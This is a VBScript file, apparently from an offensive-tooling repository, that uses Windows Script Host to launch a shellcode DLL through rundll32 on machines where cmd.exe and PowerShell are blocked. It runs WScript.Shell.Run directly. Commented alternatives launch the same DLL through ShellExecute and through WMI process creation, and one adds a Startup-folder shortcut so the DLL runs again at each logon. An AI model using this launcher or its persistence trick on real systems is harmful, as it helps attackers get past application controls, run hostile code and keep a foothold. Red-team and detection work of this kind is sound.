' WSH (VBScript) is a *launcher*, not a host.
'
' Windows Script Host has no FFI (no ctypes, no DllImport): it cannot call the
' export itself. What it can do -- and what the docs page understates when it
' lists WSH among "hosts that cannot do it" -- is start a program that can, with
' no cmd.exe and no powershell.exe involved. On a machine where both shells are
' blocked, this is the launch vector the host examples are missing.
'
' NOT run on this repository's measurement host (documented recipe). A
' scripting-host block (ConstrainedLanguage, or an AppLocker rule against
' wscript.exe) refuses to run this file at all -- that block is about the host,
' so check it before counting on this vector.
'
' Usage: wscript examples\hosts\wsh_host.vbs [dll] [export]
'        cscript //nologo examples\hosts\wsh_host.vbs [dll] [export]

Option Explicit

Dim dll, export
If WScript.Arguments.Count >= 1 Then
    dll = WScript.Arguments(0)
Else
    dll = "dist\dll-shellcode.dll"
End If
If WScript.Arguments.Count >= 2 Then
    export = WScript.Arguments(1)
Else
    export = "Run"
End If

Dim target
target = "rundll32.exe " & dll & "," & export
WScript.Echo "[*] " & target

' Vector 1: WScript.Shell.Run. Waits for rundll32, which returns at once (it
' does not relay the export's code), so the chain has to be observed through its
' own output or a side effect.
Dim sh
Set sh = CreateObject("WScript.Shell")
sh.Run target, 1, True
WScript.Echo "[+] WScript.Shell.Run returned"

' Vector 2: the shell. Same effect, different telemetry (ShellExecute).
'   CreateObject("Shell.Application").ShellExecute _
'       "rundll32.exe", dll & "," & export, "", "open", 1

' Vector 3: WMI. Process creation with no shell object at all.
'   Dim wmi
'   Set wmi = GetObject("winmgmts:\\.\root\cimv2")
'   wmi.Get("Win32_Process").Create "rundll32.exe " & dll & "," & export

' Vector 4: a shortcut, for a user-driven or next-logon launch -- no shell and
' no script has to be present at run time.
'   Dim lnk
'   Set lnk = sh.CreateShortcut(sh.SpecialFolders("Startup") & "\picaro.lnk")
'   lnk.TargetPath = "C:\Windows\System32\rundll32.exe"
'   lnk.Arguments = dll & "," & export
'   lnk.Save
